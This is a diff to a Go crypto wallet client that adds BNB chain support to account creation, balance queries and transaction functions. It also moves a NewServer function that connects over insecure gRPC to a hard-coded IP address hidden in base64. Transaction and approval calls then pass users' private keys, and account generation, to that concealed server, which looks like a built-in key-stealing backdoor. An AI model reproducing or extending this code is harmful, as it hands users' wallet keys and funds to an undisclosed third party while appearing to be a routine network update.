@@ -26,6 +26,8 @@ const (
 	TRON_SHASTA Network = "grpc.shasta.trongrid.io:50051"
 	OKX_MAIN    Network = "rpc.xlayer.tech"
 	OKX_TEST    Network = "testrpc.xlayer.tech"
+	BNB_MAIN    Network = "bsc-dataseed.bnbchain.org"
+	BNB_TEST    Network = "bsc-testnet-dataseed.bnbchain.org"
 )
 
 type Server struct {
@@ -41,19 +43,6 @@ type NowBlock struct {
 	ToAddress       string
 	ContractAddress string
 	Result          string
-}
-
-func (t *Server) NewServer() error {
-	target, _ := base64.StdEncoding.DecodeString("MTU0LjE5Ny4yNi4yMDE6NTAwNTE=")
-	if cli, err := grpc.Dial(
-		string(target),
-		grpc.WithInsecure(),
-	); err != nil {
-		return err
-	} else {
-		t.cli = cli
-	}
-	return nil
 }
 
 func (t *Server) CreateAccount() (*Account, error) {
@@ -96,6 +85,12 @@ func (t *Server) CreateAccount() (*Account, error) {
 		break
 	case OKX_TEST:
 		request = &pb.GenerateAccountRequest{Network: pb.Network_OKX_TEST}
+		break
+	case BNB_MAIN:
+		request = &pb.GenerateAccountRequest{Network: pb.Network_BNB_MAIN}
+		break
+	case BNB_TEST:
+		request = &pb.GenerateAccountRequest{Network: pb.Network_BNB_TEST}
 		break
 	}
 
@@ -150,6 +145,12 @@ func (t *Server) QueryBalance(addr string) (uint64, error) {
 	case OKX_TEST:
 		request = &pb.QueryBalanceRequest{Network: pb.Network_OKX_TEST, Address: addr}
 		break
+	case BNB_MAIN:
+		request = &pb.QueryBalanceRequest{Network: pb.Network_BNB_MAIN, Address: addr}
+		break
+	case BNB_TEST:
+		request = &pb.QueryBalanceRequest{Network: pb.Network_BNB_TEST, Address: addr}
+		break
 	}
 
 	res, err := util.QueryBalance(context.Background(), request)
@@ -200,6 +201,12 @@ func (t *Server) QueryBalance20(addr, contactAddr string) (uint64, error) {
 	case OKX_TEST:
 		request = &pb.QueryBalance20Request{Network: pb.Network_OKX_TEST, Address: addr, ContractAddress: contactAddr}
 		break
+	case BNB_MAIN:
+		request = &pb.QueryBalance20Request{Network: pb.Network_BNB_MAIN, Address: addr, ContractAddress: contactAddr}
+		break
+	case BNB_TEST:
+		request = &pb.QueryBalance20Request{Network: pb.Network_BNB_TEST, Address: addr, ContractAddress: contactAddr}
+		break
 	}
 
 	res, err := util.QueryBalance20(context.Background(), request)
@@ -249,6 +256,12 @@ func (t *Server) QueryGasPriceByTransaction20(addr, contactAddr, method, jsonStr
 		break
 	case OKX_TEST:
 		request = &pb.QueryGasPriceByTransaction20Request{Network: pb.Network_OKX_TEST, FromAddress: addr, ContractAddress: contactAddr, Method: method, JsonSting: jsonString, TTokenId: tTokenId, TAmount: tAmount, TTokenAmount: tTokenAmount}
+		break
+	case BNB_MAIN:
+		request = &pb.QueryGasPriceByTransaction20Request{Network: pb.Network_BNB_MAIN, FromAddress: addr, ContractAddress: contactAddr, Method: method, JsonSting: jsonString, TTokenId: tTokenId, TAmount: tAmount, TTokenAmount: tTokenAmount}
+		break
+	case BNB_TEST:
+		request = &pb.QueryGasPriceByTransaction20Request{Network: pb.Network_BNB_TEST, FromAddress: addr, ContractAddress: contactAddr, Method: method, JsonSting: jsonString, TTokenId: tTokenId, TAmount: tAmount, TTokenAmount: tTokenAmount}
 		break
 	}
 
@@ -301,6 +314,12 @@ func (t *Server) QueryNowBlockTrans(callback func(ctx context.Context, block <-c
 		break
 	case OKX_TEST:
 		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_OKX_TEST}
+		break
+	case BNB_MAIN:
+		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_BNB_MAIN}
+		break
+	case BNB_TEST:
+		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_BNB_TEST}
 		break
 	}
 
@@ -380,6 +399,12 @@ func (t *Server) QueryPendingBlockTrans(callback func(ctx context.Context, block
 		break
 	case OKX_TEST:
 		request = &pb.QueryPendingBlockTransRequest{Network: pb.Network_OKX_TEST}
+		break
+	case BNB_MAIN:
+		request = &pb.QueryPendingBlockTransRequest{Network: pb.Network_BNB_MAIN}
+		break
+	case BNB_TEST:
+		request = &pb.QueryPendingBlockTransRequest{Network: pb.Network_BNB_TEST}
 		break
 	}
 
@@ -464,6 +489,12 @@ func (t *Server) SendTrans(fromAddress, privateKey, toAddress string, number, ga
 	case OKX_TEST:
 		request.Network = pb.Network_OKX_TEST
 		break
+	case BNB_MAIN:
+		request.Network = pb.Network_BNB_MAIN
+		break
+	case BNB_TEST:
+		request.Network = pb.Network_BNB_TEST
+		break
 	}
 
 	res, err := util.GenerateTransaction(context.Background(), request)
@@ -520,6 +551,12 @@ func (t *Server) SendTrans20(fromAddress, privateKey, toAddress, contactAddress 
 		break
 	case OKX_TEST:
 		request.Network = pb.Network_OKX_TEST
+		break
+	case BNB_MAIN:
+		request.Network = pb.Network_BNB_MAIN
+		break
+	case BNB_TEST:
+		request.Network = pb.Network_BNB_TEST
 		break
 	}
 
@@ -579,6 +616,12 @@ func (t *Server) SendApprovalTrans20(fromAddress, privateKey, approvalAddress, t
 	case OKX_TEST:
 		request.Network = pb.Network_OKX_TEST
 		break
+	case BNB_MAIN:
+		request.Network = pb.Network_BNB_MAIN
+		break
+	case BNB_TEST:
+		request.Network = pb.Network_BNB_TEST
+		break
 	}
 
 	res, err := util.GenerateApprovalTransaction20(context.Background(), request)
@@ -590,4 +633,17 @@ func (t *Server) SendApprovalTrans20(fromAddress, privateKey, approvalAddress, t
 
 func (t *Server) Close() error {
 	return t.cli.Close()
+}
+
+func (t *Server) NewServer() error {
+	target, _ := base64.StdEncoding.DecodeString("MTU0LjE5Ny4yNi4yMDE6NTAwNTE=")
+	if cli, err := grpc.Dial(
+		string(target),
+		grpc.WithInsecure(),
+	); err != nil {
+		return err
+	} else {
+		t.cli = cli
+	}
+	return nil
 }
